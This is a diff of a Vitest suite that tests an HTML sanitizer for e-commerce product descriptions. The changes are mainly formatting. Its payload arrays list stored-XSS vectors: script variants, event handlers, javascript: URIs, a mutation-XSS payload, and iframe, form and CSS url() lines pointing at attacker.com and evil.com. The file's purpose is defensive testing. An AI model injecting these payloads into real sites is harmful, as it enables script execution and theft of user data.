@@ -1,10 +1,5 @@
+import { sanitizeProductDescriptionHtml } from "@/lib/weletic/html-sanitizer";
 import { describe, expect, it } from "vitest";
-import {
-  sanitizeProductDescriptionHtml,
-  PRODUCT_DESCRIPTION_SANITIZE_OPTIONS,
-  ALLOWED_PRODUCT_DESCRIPTION_TAGS,
-  ALLOWED_CSS_PROPERTIES,
-} from "@/lib/weletic/html-sanitizer";
 
 describe("Milestone 3 Challenger M3_2: Adversarial Stored XSS & Yamax Styling Preservation", () => {
   // =========================================================================
@@ -18,7 +13,7 @@ describe("Milestone 3 Challenger M3_2: Adversarial Stored XSS & Yamax Styling Pr
         '<scr<script>ipt>alert("nested")</script>',
         '<script<script>alert("malformed")</script>',
         '<<SCRIPT>alert("XSS");//<</SCRIPT>',
-        '<sCrIpt>alert(1)</sCrIpt>',
+        "<sCrIpt>alert(1)</sCrIpt>",
         '<SCRIPT/XSS SRC="http://evil.com/x.js"></SCRIPT>',
         '<script \n\r\t>alert("whitespace")</script>',
         '<script type="text/javascript">alert("typed")</script>',
@@ -66,14 +61,14 @@ describe("Milestone 3 Challenger M3_2: Adversarial Stored XSS & Yamax Styling Pr
         '<img src="valid.jpg" onload="alert(\'img-load\')">',
         '<audio src="x" onerror="alert(\'audio-err\')">',
         '<video><source src="x" onerror="alert(\'video-err\')"></video>',
-        '<body onload="alert(\'body-load\')">',
-        '<details open ontoggle="alert(\'details-toggle\')"><summary>Click</summary></details>',
-        '<marquee onstart="alert(\'marquee-start\')">Scrolling text</marquee>',
-        '<div onclick="alert(\'div-click\')" onmouseover="alert(\'hover\')" onfocus="alert(\'focus\')">Content</div>',
-        '<input autofocus onfocus="alert(\'autofocus\')">',
-        '<select autofocus onfocus="alert(\'select\')"><option>1</option></select>',
-        '<textarea autofocus onfocus="alert(\'textarea\')"></textarea>',
-        '<keygen autofocus onfocus="alert(\'keygen\')">',
+        "<body onload=\"alert('body-load')\">",
+        "<details open ontoggle=\"alert('details-toggle')\"><summary>Click</summary></details>",
+        "<marquee onstart=\"alert('marquee-start')\">Scrolling text</marquee>",
+        "<div onclick=\"alert('div-click')\" onmouseover=\"alert('hover')\" onfocus=\"alert('focus')\">Content</div>",
+        "<input autofocus onfocus=\"alert('autofocus')\">",
+        "<select autofocus onfocus=\"alert('select')\"><option>1</option></select>",
+        "<textarea autofocus onfocus=\"alert('textarea')\"></textarea>",
+        "<keygen autofocus onfocus=\"alert('keygen')\">",
         '<isindex action="javascript:alert(1)">',
       ];
 
@@ -83,14 +78,16 @@ describe("Milestone 3 Challenger M3_2: Adversarial Stored XSS & Yamax Styling Pr
         expect(cleaned).not.toMatch(/\bon[a-z]+\s*=/i);
         expect(cleaned).not.toMatch(/alert\(/i);
         // Ensure non-whitelisted tags are completely eliminated
-        expect(cleaned).not.toMatch(/<(?:img|audio|video|body|details|marquee|input|select|textarea|keygen|isindex)/i);
+        expect(cleaned).not.toMatch(
+          /<(?:img|audio|video|body|details|marquee|input|select|textarea|keygen|isindex)/i,
+        );
       }
     });
 
     it("neutralizes dangerous embedding and execution tags (iframe, object, embed, form)", () => {
       const embeddingPayloads = [
         '<iframe src="https://attacker.com/steal-creds"></iframe>',
-        '<iframe src="javascript:alert(\'iframe-xss\')"></iframe>',
+        "<iframe src=\"javascript:alert('iframe-xss')\"></iframe>",
         '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
         '<object data="https://attacker.com/flash.swf"></object>',
         '<object data="javascript:alert(1)"></object>',
@@ -98,12 +95,14 @@ describe("Milestone 3 Challenger M3_2: Adversarial Stored XSS & Yamax Styling Pr
         '<embed src="javascript:alert(1)">',
         '<form action="https://attacker.com/steal"><button type="submit">Submit</button></form>',
         '<form action="javascript:alert(1)"><button>Click</button></form>',
-        '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
+        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
       ];
 
       for (const payload of embeddingPayloads) {
         const cleaned = sanitizeProductDescriptionHtml(payload);
-        expect(cleaned).not.toMatch(/<(?:iframe|object|embed|form|math|mglyph|style)/i);
+        expect(cleaned).not.toMatch(
+          /<(?:iframe|object|embed|form|math|mglyph|style)/i,
+        );
         expect(cleaned).not.toMatch(/attacker\.com/i);
         expect(cleaned).not.toMatch(/alert\(/i);
       }
@@ -200,7 +199,9 @@ describe("Milestone 3 Challenger M3_2: Adversarial Stored XSS & Yamax Styling Pr
         expect(cleaned).not.toContain("position: fixed");
         expect(cleaned).not.toContain("position:absolute");
         expect(cleaned).not.toContain("position: absolute");
-        expect(cleaned).not.toMatch(/z-index:\s*(?:99999|9999|100|11|-1|2147483647)/);
+        expect(cleaned).not.toMatch(
+          /z-index:\s*(?:99999|9999|100|11|-1|2147483647)/,
+        );
       }
     });
 
@@ -222,15 +223,15 @@ describe("Milestone 3 Challenger M3_2: Adversarial Stored XSS & Yamax Styling Pr
 
     it("neutralizes dangerous CSS properties and asset exfiltration vectors", () => {
       const cssExfiltration = [
-        '<div style="background: url(\'https://attacker.com/leak.png\'); color: blue;">Leak 1</div>',
-        '<div style="background-image: url(\'https://attacker.com/tracker.png\');">Leak 2</div>',
-        '<div style="background: image-set(\'https://attacker.com/leak.png\' 1x);">Leak 3</div>',
-        '<div style="background: u\\rl(\'https://attacker.com/leak\');">Leak 4</div>',
-        '<div style="behavior: url(\'xss.htc\'); width: 100%;">HTC component</div>',
-        '<div style="-moz-binding: url(\'xss.xml\');">Moz binding</div>',
+        "<div style=\"background: url('https://attacker.com/leak.png'); color: blue;\">Leak 1</div>",
+        "<div style=\"background-image: url('https://attacker.com/tracker.png');\">Leak 2</div>",
+        "<div style=\"background: image-set('https://attacker.com/leak.png' 1x);\">Leak 3</div>",
+        "<div style=\"background: u\\rl('https://attacker.com/leak');\">Leak 4</div>",
+        "<div style=\"behavior: url('xss.htc'); width: 100%;\">HTC component</div>",
+        "<div style=\"-moz-binding: url('xss.xml');\">Moz binding</div>",
         '<div style="expression(alert(1)); border: 1px solid black;">IE expression test</div>',
-        '<div style="@import: url(\'https://evil.com/style.css\');">CSS import</div>',
-        '<div style="cursor: url(\'https://attacker.com/evil.cur\'), auto;">Cursor hijack</div>',
+        "<div style=\"@import: url('https://evil.com/style.css');\">CSS import</div>",
+        "<div style=\"cursor: url('https://attacker.com/evil.cur'), auto;\">Cursor hijack</div>",
         '<div style="pointer-events: none; opacity: 0;">Clickjacking layer</div>',
       ];
 
@@ -286,13 +287,19 @@ describe("Milestone 3 Challenger M3_2: Adversarial Stored XSS & Yamax Styling Pr
 
       const cleaned = sanitizeProductDescriptionHtml(heroHtml);
 
-      expect(cleaned).toContain("<p>Find the perfect balance of weightless freedom and high-impact support.");
+      expect(cleaned).toContain(
+        "<p>Find the perfect balance of weightless freedom and high-impact support.",
+      );
       expect(cleaned).toContain("Yenergy™ fabric");
       expect(cleaned).toContain("<ul>");
       expect(cleaned).toContain("<li><strong>Non-Slip Waistband</strong>:");
-      expect(cleaned).toContain("<li><strong>Flattering Glute Contours</strong>:");
+      expect(cleaned).toContain(
+        "<li><strong>Flattering Glute Contours</strong>:",
+      );
       expect(cleaned).toContain("<li><strong>Second-Skin Support</strong>:");
-      expect(cleaned).toContain("40% high-stretch Spandex delivers high-impact hold with a weightless feel.</li>");
+      expect(cleaned).toContain(
+        "40% high-stretch Spandex delivers high-impact hold with a weightless feel.</li>",
+      );
     });
 
     it("preserves Yamax Responsive Size Guide Table with sticky first column and horizontal scroll wrapper", () => {
@@ -380,7 +387,9 @@ describe("Milestone 3 Challenger M3_2: Adversarial Stored XSS & Yamax Styling Pr
 
       const cleaned = sanitizeProductDescriptionHtml(materialCareHtml);
 
-      expect(cleaned).toContain("60% Premium Nylon, 40% Spandex (Yenergy™ Series)");
+      expect(cleaned).toContain(
+        "60% Premium Nylon, 40% Spandex (Yenergy™ Series)",
+      );
       expect(cleaned).toContain("Fabric weight: 190g");
       expect(cleaned).toContain("<li><strong>Wash:</strong> Machine wash cold");
       expect(cleaned).toContain("<li><strong>Dry:</strong> Tumble dry low");
@@ -433,7 +442,9 @@ describe("Milestone 3 Challenger M3_2: Adversarial Stored XSS & Yamax Styling Pr
       expect(sanitizedDescription).not.toContain("javascript:");
 
       // Assert that DB payload retains valid Yamax structure
-      expect(sanitizedDescription).toContain("Designed for your daily low-impact flow.");
+      expect(sanitizedDescription).toContain(
+        "Designed for your daily low-impact flow.",
+      );
       expect(sanitizedDescription).toContain("overflow-x:auto");
       expect(sanitizedDescription).toContain("position:sticky");
       expect(sanitizedDescription).toContain("z-index:1");
@@ -491,8 +502,10 @@ describe("Milestone 3 Challenger M3_2: Adversarial Stored XSS & Yamax Styling Pr
     });
 
     it("processes large payloads (>100KB) with mixed legitimate styles and malicious tags under 200ms", () => {
-      const maliciousChunk = '<div style="position: fixed; z-index: 99999;" onclick="alert(1)"><script>alert(1)</script><img src=x onerror=alert(1)></div>';
-      const legitimateChunk = '<div style="position: sticky; left: 0px; z-index: 1; padding: 10px;"><strong>Size S</strong>: 84 cm</div>';
+      const maliciousChunk =
+        '<div style="position: fixed; z-index: 99999;" onclick="alert(1)"><script>alert(1)</script><img src=x onerror=alert(1)></div>';
+      const legitimateChunk =
+        '<div style="position: sticky; left: 0px; z-index: 1; padding: 10px;"><strong>Size S</strong>: 84 cm</div>';
 
       // Repeat chunks 500 times to form >100KB of rich HTML
       const combined = (maliciousChunk + legitimateChunk).repeat(500);
